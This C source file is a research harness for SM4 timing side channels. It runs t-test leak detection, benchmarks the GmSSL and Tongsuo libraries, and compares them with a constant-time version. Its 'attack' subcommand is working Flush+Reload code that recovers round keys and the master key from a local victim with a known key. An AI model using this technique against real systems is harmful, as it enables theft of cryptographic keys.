/* hengshi.c - 衡时 主程序
 *
 * 四个子命令：
 *   verify    用标准测试向量自检 SM4 实现
 *   ttest     两类别 Welch t 检验（泄漏检测）
 *   converge  √n 收敛实验：真泄漏 |t| 随样本量增长，噪声不增长
 *   attack    Flush+Reload 观测 + 轮密钥恢复 + 主密钥反推
 *   all       依次跑全部
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>
#include <malloc.h>

#if defined(_WIN32)
#  include <windows.h>
#endif

#include "timing.h"
#include "sm4.h"

/* ------------------------------------------------------------------ 统计 */
typedef struct { double mean, var; int n; } stat_t;

static int cmp_u64(const void* a, const void* b) {
    uint64_t x = *(const uint64_t*)a, y = *(const uint64_t*)b;
    return (x > y) - (x < y);
}

static void stat_of(const uint64_t* v, int n, stat_t* s) {
    double sum = 0;
    for (int i = 0; i < n; i++) sum += (double)v[i];
    double m = sum / n, q = 0;
    for (int i = 0; i < n; i++) { double d = (double)v[i] - m; q += d * d; }
    s->mean = m; s->var = (n > 1) ? q / (n - 1) : 0; s->n = n;
}

/* Welch t：裁剪后的两组均值差异 / 标准误 */
static double welch_t(uint64_t* a, uint64_t* b, int n, stat_t* sa, stat_t* sb) {
    int cut = n / 20;
    int kept = n - 2 * cut;
    qsort(a, (size_t)n, sizeof(uint64_t), cmp_u64);
    qsort(b, (size_t)n, sizeof(uint64_t), cmp_u64);
    stat_of(a + cut, kept, sa);
    stat_of(b + cut, kept, sb);
    double se = sqrt((sa->var / sa->n) + (sb->var / sb->n));
    return (se > 0) ? (sa->mean - sb->mean) / se : 0.0;
}

static double median3(double a, double b, double c) {
    if (a > b) { double t = a; a = b; b = t; }
    if (b > c) { b = c; }
    if (a > b) { b = a; }
    return b;
}

/* ------------------------------------------------------------------ 采样器 */
static uint32_t g_rng = 0x1234ABCDu;static uint32_t rng(void) {
    uint32_t x = g_rng;
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    return g_rng = x;
}

/* 生成输入：两个类别走完全相同的指令路径，最后用掩码清零。
 * 为什么必须这样：若 cls==0 走 memset、cls!=0 走 memcpy 循环，
 * 进入计时区之前的微架构状态就不同（I-cache、分支预测、store buffer），
 * 短计时区里这点差异会被 t 检验当成"泄漏"——这就是假阳性的来源。 */
static inline void gen_input(uint8_t in[16], int cls) {
    uint8_t r[16];
    for (int i = 0; i < 16; i += 4) { uint32_t x = rng(); memcpy(r + i, &x, 4); }
    uint8_t mask = (uint8_t)(0 - (uint8_t)(cls != 0));   /* 全 0 或全 1，无分支 */
    for (int i = 0; i < 16; i++) in[i] = (uint8_t)(r[i] & mask);
}

typedef void (*enc_fn)(const sm4_key*, const uint8_t*, uint8_t*);
static volatile uint32_t g_sink;

/* 一次测量：固定类（全 0 明文）或随机类（随机明文），测量前 flush 全部表 */
static uint64_t measure_once(enc_fn fn, const sm4_key* k, int cls) {
    uint8_t in[16], out[16];
    gen_input(in, cls);
    sm4_tables_flush();

    fence_all();
    uint64_t t0 = now_cycles();
    fn(k, in, out);
    fence_all();
    uint64_t t1 = now_cycles();

    g_sink ^= (uint32_t)out[0];
    return t1 - t0;
}

/* ------------------------------------------------------------------ verify */
static int cmd_verify(void) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    static const uint8_t P[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    static const uint8_t C[16] = {0x68,0x1e,0xdf,0x34,0xd2,0x06,0x96,0x5e,0x86,0xb3,0xe9,0x4f,0x53,0x6e,0x42,0x46};

    if (sm4_tables_alloc(4) != 0) { printf("[verify] table alloc failed\n"); return 1; }

    sm4_key k;
    sm4_set_enc_key(K, &k);

    uint8_t out_tt[16], out_ct[16];
    sm4_tt(&k, P, out_tt);
    sm4_ct(&k, P, out_ct);

    int ok_tt = memcmp(out_tt, C, 16) == 0;
    int ok_ct = memcmp(out_ct, C, 16) == 0;

    printf("[verify] 标准测试向量 (GB/T 32907)\n");
    printf("  expected : "); for (int i=0;i<16;i++) printf("%02x", C[i]); printf("\n");
    printf("  ttable   : "); for (int i=0;i<16;i++) printf("%02x", out_tt[i]); printf("  %s\n", ok_tt?"OK":"FAIL");
    printf("  ct       : "); for (int i=0;i<16;i++) printf("%02x", out_ct[i]); printf("  %s\n", ok_ct?"OK":"FAIL");

    return (ok_tt && ok_ct) ? 0 : 1;
}

/* ------------------------------------------------------------------ ttest */
static double run_ttest(enc_fn fn, int n, stat_t* sa, stat_t* sb) {
    uint64_t* a = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    uint64_t* b = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    if (!a || !b) { printf("oom\n"); exit(1); }

    static const uint8_t K[16] = {0xA1,0xB2,0xC3,0xD4,0xE5,0xF6,0x07,0x18,0x29,0x3A,0x4B,0x5C,0x6D,0x7E,0x8F,0x90};
    sm4_key k;
    sm4_set_enc_key(K, &k);

    for (int i = 0; i < 500; i++) (void)measure_once(fn, &k, i & 1);

    int na = 0, nb = 0;
    while (na < n || nb < n) {
        int cls = (int)(rng() & 1u);
        uint64_t c = measure_once(fn, &k, cls);
        if (cls == 0) { if (na < n) a[na++] = c; }
        else          { if (nb < n) b[nb++] = c; }
    }
    double t = welch_t(a, b, n, sa, sb);
    free(a); free(b);
    return t;
}

static int cmd_ttest(int n) {
    sm4_tables_alloc(4);
    stat_t sa, sb;

    /* 重复三次取中位数：单次 |t| 受 CPU 调频与后台负载影响，中位数更可复现 */
    double r[3];
    printf("=== T-table（真实世界主流写法）===\n");
    for (int i = 0; i < 3; i++) {
        r[i] = run_ttest(sm4_tt, n, &sa, &sb);
        printf("  run %d : t = %8.2f   A(fixed) mean=%9.2f  B(random) mean=%9.2f  差=%+.2f%%\n",
               i + 1, r[i], sa.mean, sb.mean, (sb.mean - sa.mean) / sa.mean * 100.0);
    }
    double t_tt = median3(r[0], r[1], r[2]);
    printf("  median t = %8.2f   %s\n\n", t_tt, fabs(t_tt) > 4.5 ? ">>> LEAK DETECTED" : ">>> no leak");

    printf("=== 常量时间版 ===\n");
    for (int i = 0; i < 3; i++) {
        r[i] = run_ttest(sm4_ct, n, &sa, &sb);
        printf("  run %d : t = %8.2f   A(fixed) mean=%9.2f  B(random) mean=%9.2f  差=%+.2f%%\n",
               i + 1, r[i], sa.mean, sb.mean, (sb.mean - sa.mean) / sa.mean * 100.0);
    }
    double t_ct = median3(r[0], r[1], r[2]);
    printf("  median t = %8.2f   %s\n\n", t_ct, fabs(t_ct) > 4.5 ? ">>> LEAK DETECTED" : ">>> no leak");

    return 0;
}

/* ------------------------------------------------------------------ converge */
/* 每个样本量重复 REPS 次取中位：
 * 单次 |t| 受机器负载影响，直接连跑会出现"高样本量端回落"的假象，
 * 中位数能压掉这种偶发拖累。 */
#define CONV_REPS 3
static int cmd_converge(void) {
    sm4_tables_alloc(4);
    stat_t sa, sb;
    printf("sqrt(n) 收敛实验：真泄漏 |t| 应随样本量增长，噪声不增长（每个 n 重复 %d 次取中位）\n", CONV_REPS);
    printf("%10s %14s %12s\n", "n/class", "|t| ttable", "|t| ct");
    const int ns[] = { 2000, 5000, 10000, 20000, 40000, 80000 };
    for (unsigned i = 0; i < sizeof(ns)/sizeof(ns[0]); i++) {
        double r1[CONV_REPS], r2[CONV_REPS];
        for (int k = 0; k < CONV_REPS; k++) {
            r1[k] = fabs(run_ttest(sm4_tt, ns[i], &sa, &sb));
            r2[k] = fabs(run_ttest(sm4_ct, ns[i], &sa, &sb));
        }
        double m1 = median3(r1[0], r1[1], r1[CONV_REPS - 1]);
        double m2 = median3(r2[0], r2[1], r2[CONV_REPS - 1]);
        printf("%10d %14.2f %12.2f\n", ns[i], m1, m2);
    }
    printf("\n解读：ttable 的 |t| 总体按 sqrt(n) 上升；ct 的 |t| 在阈值下方随机游走、不随 n 增长。\n");
    return 0;
}

/* ------------------------------------------------------------------ attack */
static uint8_t  g_threshold_hit = 0;
static size_t   g_lines_per_table = 0;
static uint8_t* g_hits = 0;
static size_t*  g_probe_order = 0;   /* 乱序探测：顺序扫会被硬件预取器提前拉进缓存，导致"全部命中"的假饱和 */
static size_t   g_probe_total = 0;

static void build_probe_order(size_t total) {
    g_probe_order = (size_t*)malloc(total * sizeof(size_t));
    g_probe_total = total;
    for (size_t i = 0; i < total; i++) g_probe_order[i] = i;
    for (size_t i = total; i > 1; i--) {
        size_t j = (size_t)(rng() % (uint32_t)i);
        size_t t = g_probe_order[i - 1];
        g_probe_order[i - 1] = g_probe_order[j];
        g_probe_order[j] = t;
    }
}

static void calibrate_threshold(void) {
    uint32_t* t0 = sm4_table(0);
    flush_line(t0);
    fence_all();
    uint64_t a = now_cycles();
    volatile uint32_t x = *t0;
    fence_all();
    uint64_t b = now_cycles();
    uint64_t cold = b - a;

    fence_all();
    a = now_cycles();
    x = *t0;
    fence_all();
    b = now_cycles();
    uint64_t hot = b - a;
    (void)x;

    uint64_t th = (cold + hot) / 2;
    if (th < 60) th = 60;
    g_threshold_hit = (uint8_t)(th > 255 ? 255 : th);
    printf("[attack] 阈值标定：cold=%llu  hot=%llu  threshold=%u\n",
           (unsigned long long)cold, (unsigned long long)hot, (unsigned)g_threshold_hit);
}

/* 观测一次加密：返回每张表每条缓存行是否被访问 */
static void observe(enc_fn fn, const sm4_key* k, const uint8_t pt[16], uint8_t* hit) {
    for (int t = 0; t < 4; t++) flush_block(sm4_table(t), sm4_table_bytes());

    uint8_t out[16];
    fn(k, pt, out);
    g_sink ^= out[0];

    for (size_t k2 = 0; k2 < g_probe_total; k2++) {
        size_t idx = g_probe_order[k2];
        int t = (int)(idx / g_lines_per_table);
        size_t l = idx % g_lines_per_table;
        const volatile char* p = (const volatile char*)((const char*)sm4_table(t) + l * 64);
        fence_all();
        uint64_t c0 = now_cycles();
        volatile char v = *p;
        fence_all();
        uint64_t c1 = now_cycles();
        (void)v;
        hit[idx] = ((c1 - c0) <= g_threshold_hit) ? 1 : 0;
    }
}

/* 对某张表、某一字节位置，用"命中集合成员关系"给 256 个猜测打分 */
static int score_guesses(uint8_t* hits, int traces, int table_idx, const uint8_t* tbytes, int* order) {
    int best = -1, best_score = -1;
    int scores[256];
    for (int g = 0; g < 256; g++) {
        int sc = 0;
        for (int i = 0; i < traces; i++) {
            uint32_t idx = (uint32_t)(tbytes[i] ^ (uint8_t)g);
            size_t stride = sm4_table_stride();
            size_t line = (idx * stride) / 64;
            if (line >= g_lines_per_table) line = g_lines_per_table - 1;
            sc += hits[i * 4 * g_lines_per_table + (size_t)table_idx * g_lines_per_table + line];
        }
        scores[g] = sc;
        if (sc > best_score) { best_score = sc; best = g; }
    }
    /* 第二名的分数差，用来判断可信度 */
    int second = -1;
    for (int g = 0; g < 256; g++) {
        if (g == best) continue;
        if (scores[g] > second) second = scores[g];
    }
    order[0] = best;
    order[1] = best_score;
    order[2] = second;
    return best;
}

static int g_victim_rounds = 32;
static void victim(const sm4_key* k, const uint8_t in[16], uint8_t out[16]) {
    sm4_tt_rounds(k, in, out, g_victim_rounds);
}

static int cmd_attack(size_t stride, int traces, int victim_rounds) {
    if (sm4_tables_alloc(stride) != 0) { printf("alloc failed\n"); return 1; }
    g_victim_rounds = (victim_rounds > 0 && victim_rounds <= 32) ? victim_rounds : 32;
    g_lines_per_table = sm4_table_bytes() / 64;
    size_t total_lines = 4 * g_lines_per_table;
    g_hits = (uint8_t*)malloc(total_lines * (size_t)traces);
    if (!g_hits) { printf("oom\n"); return 1; }
    build_probe_order(total_lines);

    static const uint8_t TRUE_KEY[16] = {
        0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10
    };
    sm4_key k;
    sm4_set_enc_key(TRUE_KEY, &k);

    printf("[attack] 表布局 stride=%zu 字节/项，%zu 条缓存行/表，trace 数=%d，被攻击实现轮数=%d\n",
           stride, g_lines_per_table, traces, g_victim_rounds);
    printf("[attack] 目标：恢复前 4 个轮密钥字（每字 32 bit）\n");

    calibrate_threshold();

    /* 采集：每条 trace 用一个随机明文 */
    uint8_t (*pts)[16] = (uint8_t(*)[16])malloc((size_t)traces * 16);
    for (int i = 0; i < traces; i++)
        for (int j = 0; j < 16; j += 4) { uint32_t r = rng(); memcpy(pts[i] + j, &r, 4); }

    for (int i = 0; i < traces; i++) {
        observe(victim, &k, pts[i], g_hits + (size_t)i * total_lines);
        if ((i + 1) % 50 == 0) printf("  ... 已采集 %d/%d 条 trace\n", i + 1, traces);
    }

    /* 逐轮恢复：每条 trace 维护自己的轮状态 */
    uint32_t (*st)[4] = (uint32_t(*)[4])malloc((size_t)traces * 4 * sizeof(uint32_t));
    if (!st) { printf("oom\n"); return 1; }
    for (int i = 0; i < traces; i++) {
        for (int w = 0; w < 4; w++)
            st[i][w] = ((uint32_t)pts[i][w*4] << 24) | ((uint32_t)pts[i][w*4+1] << 16) |
                       ((uint32_t)pts[i][w*4+2] << 8) | (uint32_t)pts[i][w*4+3];
    }

    static uint8_t tbytes[4][8192];
    uint32_t recovered[4] = { 0, 0, 0, 0 };
    int bits_per_byte = (stride >= 64) ? 8 : 4;

    for (int round = 0; round < 4 && round < g_victim_rounds; round++) {
        for (int i = 0; i < traces; i++) {
            uint32_t t = st[i][1] ^ st[i][2] ^ st[i][3];
            tbytes[0][i] = (uint8_t)(t >> 24);
            tbytes[1][i] = (uint8_t)(t >> 16);
            tbytes[2][i] = (uint8_t)(t >> 8);
            tbytes[3][i] = (uint8_t)(t);
        }

        uint32_t rk_guess = 0;
        for (int j = 0; j < 4; j++) {
            int order[3];
            int g = score_guesses(g_hits, traces, j, tbytes[j], order);
            if (bits_per_byte == 4) g &= 0xF0;   /* 自然布局只能看到高 4 位 */
            rk_guess |= ((uint32_t)(uint8_t)g) << (24 - 8 * j);
            printf("  round %d byte %d : guess=0x%02x  score=%d/%d  (次优=%d)\n",
                   round, j, (uint8_t)g, order[1], traces, order[2]);
        }
        recovered[round] = rk_guess;

        for (int i = 0; i < traces; i++) {
            uint32_t t = st[i][1] ^ st[i][2] ^ st[i][3] ^ rk_guess;
            uint32_t x4 = st[i][0] ^ sm4_T(t);
            st[i][0] = st[i][1]; st[i][1] = st[i][2]; st[i][2] = st[i][3]; st[i][3] = x4;
        }
    }
    free(st);

    printf("\n[attack] 真实 rk[0..3] :");
    for (int i = 0; i < 4; i++) printf(" %08x", k.rk[i]);
    printf("\n[attack] 恢复 rk[0..3] :");
    for (int i = 0; i < 4; i++) printf(" %08x", recovered[i]);
    printf("\n");

    if (stride >= 64) {
        uint32_t rkfull[32] = {0};
        for (int i = 0; i < 4; i++) rkfull[i] = recovered[i];
        uint8_t mk[16];
        sm4_master_from_round_keys(rkfull, mk);
        printf("[attack] 反推主密钥 : ");
        for (int i = 0; i < 16; i++) printf("%02x", mk[i]);
        printf("\n[attack] 真实主密钥 : ");
        for (int i = 0; i < 16; i++) printf("%02x", TRUE_KEY[i]);
        printf("\n[attack] 结论: %s\n", memcmp(mk, TRUE_KEY, 16) == 0 ? "主密钥完全恢复" : "仅恢复部分比特");
    } else {
        printf("[attack] 结论: 自然布局（16 项/缓存行）下，观测到的只有表项所在缓存行的编号，\n");
        printf("         即 rk[0] 每个字节的高 4 位（共 16 bit）；上面 round 1..3 因无法用半可信的\n");
        printf("         rk[0] 推进状态而失真，属预期现象，不作结论。\n");
        printf("         改用行对齐布局（stride=64）可恢复完整 32 bit 轮密钥，进而反推主密钥。\n");
    }

    free(pts); free(g_hits); g_hits = 0;
    return 0;
}

/* ------------------------------------------------------------------ 真实国产库：GmSSL
 *
 * 这里直接编译 GmSSL 官方 src/sm4.c（Apache-2.0），不做任何改写，
 * 目的是回答一个具体问题：真实在用的国密库，常量时间上到底干不干净。
 */
typedef struct { uint32_t rk[32]; } gmssl_sm4_key;
extern void sm4_set_encrypt_key(gmssl_sm4_key* key, const uint8_t user_key[16]);
extern void sm4_encrypt(const gmssl_sm4_key* key, const unsigned char in[16], unsigned char out[16]);
extern const uint32_t T0[256];
extern const uint32_t T1[256];
extern const uint32_t T2[256];
extern const uint32_t T3[256];

static void gmssl_flush(void) {
    flush_block((void*)T0, sizeof(T0));
    flush_block((void*)T1, sizeof(T1));
    flush_block((void*)T2, sizeof(T2));
    flush_block((void*)T3, sizeof(T3));
}

static uint64_t measure_real(const gmssl_sm4_key* k, int cls) {
    uint8_t in[16], out[16];
    gen_input(in, cls);
    gmssl_flush();

    fence_all();
    uint64_t t0 = now_cycles();
    sm4_encrypt(k, in, out);
    fence_all();
    uint64_t t1 = now_cycles();

    g_sink ^= (uint32_t)out[0];
    return t1 - t0;
}

static int cmd_real(int n) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    static const uint8_t P[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    static const uint8_t C[16] = {0x68,0x1e,0xdf,0x34,0xd2,0x06,0x96,0x5e,0x86,0xb3,0xe9,0x4f,0x53,0x6e,0x42,0x46};

    gmssl_sm4_key k;
    sm4_set_encrypt_key(&k, K);
    uint8_t out[16];
    sm4_encrypt(&k, P, out);
    int ok = memcmp(out, C, 16) == 0;

    printf("=== GmSSL 官方 sm4.c ===\n");
    printf("  标准向量: %s\n", ok ? "OK" : "FAIL");

    /* 对齐检查：GmSSL 的 T 表是否按 64 字节对齐 */
    uintptr_t a0 = (uintptr_t)T0;
    printf("  T0 地址对齐: 0x%llx (%%64 = %llu) 表项大小 %zu B -> 每缓存行 %zu 项\n",
           (unsigned long long)a0, (unsigned long long)(a0 % 64), sizeof(uint32_t), 64 / sizeof(uint32_t));

    uint64_t* a = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    uint64_t* b = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    if (!a || !b) { printf("oom\n"); return 1; }

    for (int i = 0; i < 500; i++) (void)measure_real(&k, i & 1);

    int na = 0, nb = 0;
    while (na < n || nb < n) {
        int cls = (int)(rng() & 1u);
        uint64_t c = measure_real(&k, cls);
        if (cls == 0) { if (na < n) a[na++] = c; }
        else          { if (nb < n) b[nb++] = c; }
    }

    stat_t sa, sb;
    double tr[3];
    for (int rep = 0; rep < 3; rep++) {
        na = nb = 0;
        while (na < n || nb < n) {
            int cls = (int)(rng() & 1u);
            uint64_t c = measure_real(&k, cls);
            if (cls == 0) { if (na < n) a[na++] = c; }
            else          { if (nb < n) b[nb++] = c; }
        }
        tr[rep] = welch_t(a, b, n, &sa, &sb);
        printf("  run %d : t = %8.2f   A(fixed) mean=%9.2f  B(random) mean=%9.2f  差=%+.2f%%\n",
               rep + 1, tr[rep], sa.mean, sb.mean, (sb.mean - sa.mean) / sa.mean * 100.0);
    }
    double t = median3(tr[0], tr[1], tr[2]);
    printf("  median t = %8.2f   %s\n", t, fabs(t) > 4.5 ? ">>> GmSSL 的 SM4 存在密钥相关时间泄漏" : ">>> 未检出泄漏");
    printf("  说明: T 表建在 .rodata，只读不可改，攻击者只能观测；这正是真实攻击场景。\n");

    free(a); free(b);
    return 0;
}

/* ------------------------------------------------------------------ heat：导出一条 trace 的缓存行命中图 */
static int cmd_heat(size_t stride, const char* path) {
    static const uint8_t K[16] = {0xA1,0xB2,0xC3,0xD4,0xE5,0xF6,0x07,0x18,0x29,0x3A,0x4B,0x5C,0x6D,0x7E,0x8F,0x90};
    if (sm4_tables_alloc(stride) != 0) return 1;
    g_lines_per_table = sm4_table_bytes() / 64;
    size_t total = 4 * g_lines_per_table;
    size_t* ord = (size_t*)malloc(total * sizeof(size_t));
    for (size_t i = 0; i < total; i++) ord[i] = i;
    for (size_t i = total; i > 1; i--) {
        size_t j = (size_t)(rng() % (uint32_t)i);
        size_t t = ord[i-1]; ord[i-1] = ord[j]; ord[j] = t;
    }

    sm4_key k; sm4_set_enc_key(K, &k);
    calibrate_threshold();

    uint8_t* hit = (uint8_t*)malloc(total);
    uint8_t pt[16];
    for (int i = 0; i < 16; i += 4) { uint32_t r = rng(); memcpy(pt + i, &r, 4); }

    for (int t = 0; t < 4; t++) flush_block(sm4_table(t), sm4_table_bytes());
    uint8_t out[16];
    sm4_tt(&k, pt, out);
    g_sink ^= out[0];

    for (size_t i = 0; i < total; i++) {
        size_t idx = ord[i];
        int t = (int)(idx / g_lines_per_table);
        size_t l = idx % g_lines_per_table;
        const volatile char* p = (const volatile char*)((const char*)sm4_table(t) + l * 64);
        fence_all();
        uint64_t c0 = now_cycles();
        volatile char v = *p;
        fence_all();
        uint64_t c1 = now_cycles();
        (void)v;
        hit[idx] = ((c1 - c0) <= g_threshold_hit) ? 1 : 0;
    }

    FILE* f = fopen(path, "w");
    if (!f) { printf("cannot write %s\n", path); return 1; }
    fprintf(f, "table,line,hit\n");
    for (size_t idx = 0; idx < total; idx++)
        fprintf(f, "%zu,%zu,%u\n", idx / g_lines_per_table, idx % g_lines_per_table, hit[idx]);
    fclose(f);
    free(hit); free(ord);
    printf("[heat] wrote %s  (stride=%zu, %zu lines/table)\n", path, stride, g_lines_per_table);
    return 0;
}

/* ------------------------------------------------------------------ 第二个国产库：Tongsuo
 *
 * 官方源码，编译时只加 /Dstatic=（把 static 表暴露出来供缓存观测），算法与表内容未改。
 */
typedef struct { uint32_t rk[32]; } tongsuo_sm4_key;
extern int  ossl_sm4_set_key(const uint8_t *key, void *ks);
extern void ossl_sm4_encrypt(const uint8_t *in, uint8_t *out, const void *ks);
extern const uint32_t SM4_SBOX_T0[256];
extern const uint32_t SM4_SBOX_T1[256];
extern const uint32_t SM4_SBOX_T2[256];
extern const uint32_t SM4_SBOX_T3[256];

static void tongsuo_flush(void) {
    flush_block((void*)SM4_SBOX_T0, sizeof(uint32_t) * 256);
    flush_block((void*)SM4_SBOX_T1, sizeof(uint32_t) * 256);
    flush_block((void*)SM4_SBOX_T2, sizeof(uint32_t) * 256);
    flush_block((void*)SM4_SBOX_T3, sizeof(uint32_t) * 256);
}

static uint64_t measure_tongsuo(const tongsuo_sm4_key* k, int cls) {
    uint8_t in[16], out[16];
    gen_input(in, cls);
    tongsuo_flush();

    fence_all();
    uint64_t t0 = now_cycles();
    ossl_sm4_encrypt(in, out, k);
    fence_all();
    uint64_t t1 = now_cycles();

    g_sink ^= (uint32_t)out[0];
    return t1 - t0;
}

/* pristine 构建（与上游默认编译一致）——统计检测用这一份；
 * /Dstatic= 构建——缓存观测用那一份。两者代码生成不同，不能混用。 */
extern void ts_plain_encrypt(const uint8_t *in, uint8_t *out, const void *ks);
extern int  ts_plain_set_key(const uint8_t *key, void *ks);

static uint64_t measure_tongsuo_pristine(const tongsuo_sm4_key* k, int cls) {
    uint8_t in[16], out[16];
    gen_input(in, cls);
    /* pristine 构建不暴露内部表，无法 flush；这与真实攻击者面对的情形一致 */
    fence_all();
    uint64_t t0 = now_cycles();
    ts_plain_encrypt(in, out, k);
    fence_all();
    uint64_t t1 = now_cycles();
    g_sink ^= (uint32_t)out[0];
    return t1 - t0;
}

static uint64_t tongsuo_pristine_fn(const void* k, int cls) {
    return measure_tongsuo_pristine((const tongsuo_sm4_key*)k, cls);
}

static uint64_t tongsuo_fn(const void* k, int cls) { return measure_tongsuo((const tongsuo_sm4_key*)k, cls); }

/* ------------------------------------------------------------------ 多库横向对比（机器可读输出）
 * 输出格式固定为：LIB <名字> t=<绝对值> effect=<百分比绝对值>
 * 供 make_report.py 直接解析，避免再改 C 代码。
 */
/* 前向声明：下面几个函数定义在"同库配置对比"一节 */
static double ttest_raw(uint64_t (*fn)(const void*, int), const void* key, int n, stat_t* sa, stat_t* sb);
static uint64_t tt_fn(const void* k, int cls);

static int cmd_libs(int n, int reps) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    gmssl_sm4_key ktt;   sm4_set_encrypt_key(&ktt, K);
    tongsuo_sm4_key kts; ossl_sm4_set_key(K, &kts);

    struct { const char* name; uint64_t (*fn)(const void*, int); const void* key; } libs[] = {
        { "GmSSL", tt_fn, &ktt },
        { "Tongsuo-obs", tongsuo_fn, &kts },
        { "Tongsuo-pri", tongsuo_pristine_fn, &kts },
    };
    const int nv = (int)(sizeof(libs) / sizeof(libs[0]));

    printf("# 横向对比：%d 个口径，每个重复 %d 轮（每类 %d 样本）\n", nv, reps, n);
    printf("# -obs = 暴露内部表的构建（可 flush）；-pri = pristine 构建（表为 static，外部无法 flush）\n");

    for (int i = 0; i < nv; i++) {
        double ts[32];
        int r = reps > 32 ? 32 : reps;
        for (int k = 0; k < r; k++) {
            stat_t sa, sb;
            ts[k] = fabs(ttest_raw(libs[i].fn, libs[i].key, n, &sa, &sb));
        }
        double sorted[32];
        memcpy(sorted, ts, sizeof(double) * (size_t)r);
        for (int a = 0; a < r; a++)
            for (int b = a + 1; b < r; b++)
                if (sorted[b] < sorted[a]) { double tmp = sorted[a]; sorted[a] = sorted[b]; sorted[b] = tmp; }
        double med = sorted[r / 2], mx = sorted[r - 1], mn = sorted[0];
        double eff = 0.0;
        /* 效应量另测一轮，用于报告 */
        {
            stat_t sa, sb;
            ttest_raw(libs[i].fn, libs[i].key, n, &sa, &sb);
            eff = fabs(sa.mean - sb.mean) / (sb.mean != 0 ? sb.mean : 1.0) * 100.0;
        }
        const char* verdict = (med > 4.5) ? "LEAK" : "clean";
        const char* stability = "";
        /* 双向不稳定：中位在阈值内但最大越阈值，或中位越阈值但最小落在阈值内 */
        if ((med <= 4.5 && mx > 4.5) || (med > 4.5 && mn <= 4.5)) stability = " UNSTABLE";
        printf("LIB %s t=%.2f min=%.2f max=%.2f effect=%.3f verdict=%s%s\n",
               libs[i].name, med, mn, mx, eff, verdict, stability);
    }
    printf("# UNSTABLE = 跨轮范围穿过阈值（max 越阈值或 min 落回阈值内），判定对机器状态敏感\n");
    return 0;
}
/* ------------------------------------------------------------------ 同库两种配置对比
 *
 * GmSSL 同一份源码，两种编译配置：
 *   T-table 路径     ：4 KB 表，每缓存行 16 项，下标由密钥决定
 *   小表路径（SMALL） ：256 B S-box，只占 4 条缓存行，但仍按键值查表
 * 唯一变化的变量是表的布局，其余（算法、编译选项、机器）完全相同。
 */
typedef struct { uint32_t rk[32]; } gmssl_small_key;
extern void gmssl_small_set_encrypt_key(gmssl_small_key* key, const uint8_t user_key[16]);
extern void gmssl_small_encrypt(const gmssl_small_key* key, const unsigned char in[16], unsigned char out[16]);
extern const uint8_t gmssl_small_S[256];

static void gmssl_small_flush(void) { flush_block((void*)gmssl_small_S, sizeof(gmssl_small_S)); }

static uint64_t measure_small(const gmssl_small_key* k, int cls) {
    uint8_t in[16], out[16];
    gen_input(in, cls);
    gmssl_small_flush();
    fence_all();
    uint64_t t0 = now_cycles();
    gmssl_small_encrypt(k, in, out);
    fence_all();
    uint64_t t1 = now_cycles();
    g_sink ^= (uint32_t)out[0];
    return t1 - t0;
}

static uint64_t small_fn(const void* k, int cls) { return measure_small((const gmssl_small_key*)k, cls); }
static uint64_t tt_fn(const void* k, int cls)    { return measure_real((const gmssl_sm4_key*)k, cls); }

static double ttest_raw(uint64_t (*fn)(const void*, int), const void* key, int n, stat_t* sa, stat_t* sb) {
    uint64_t* a = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    uint64_t* b = (uint64_t*)malloc(sizeof(uint64_t) * (size_t)n);
    if (!a || !b) { printf("oom\n"); exit(1); }
    for (int i = 0; i < 400; i++) (void)fn(key, i & 1);
    int na = 0, nb = 0;
    while (na < n || nb < n) {
        int cls = (int)(rng() & 1u);
        uint64_t c = fn(key, cls);
        if (cls == 0) { if (na < n) a[na++] = c; } else { if (nb < n) b[nb++] = c; }
    }
    double t = welch_t(a, b, n, sa, sb);
    free(a); free(b);
    return t;
}

static int cmd_compare(int n) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};

    gmssl_sm4_key ktt;   sm4_set_encrypt_key(&ktt, K);
    gmssl_small_key ksm; gmssl_small_set_encrypt_key(&ksm, K);

    stat_t sa, sb;
    double r[3], eff_tt = 0, r2[3], eff_sm = 0;
    for (int i = 0; i < 3; i++) {
        r[i] = ttest_raw(tt_fn, &ktt, n, &sa, &sb);
        eff_tt = (sb.mean - sa.mean) / sa.mean * 100.0;
    }
    for (int i = 0; i < 3; i++) {
        r2[i] = ttest_raw(small_fn, &ksm, n, &sa, &sb);
        eff_sm = (sb.mean - sa.mean) / sa.mean * 100.0;
    }
    double ttt = median3(r[0], r[1], r[2]);
    double tsm = median3(r2[0], r2[1], r2[2]);

    printf("=== 同一份 GmSSL 源码，两种表布局（各跑三次取中位）===\n");
    printf("  T-table 路径 (4 KB, 16 项/行) : t=%8.2f  效应量=%+.3f%%   %s\n",
           ttt, eff_tt, fabs(ttt) > 4.5 ? "LEAK" : "clean");
    printf("  小表路径    (256 B, 4 行)     : t=%8.2f  效应量=%+.3f%%   %s\n",
           tsm, eff_sm, fabs(tsm) > 4.5 ? "LEAK" : "clean");
    printf("\n  解读: 小表只占 4 条缓存行，行号几乎不随密钥变化，但泄漏依旧存在。\n");
    printf("        说明泄漏的根源不是「表有多大」，而是「访存地址由数据决定」。\n");
    printf("        把表缩小到能装进 L1 并不能修好它，只有消除地址的数据相关性才行。\n");
    printf("        （对照：我们的常量时间版地址与数据无关，t 值落在阈值内。）\n");
    return 0;
}
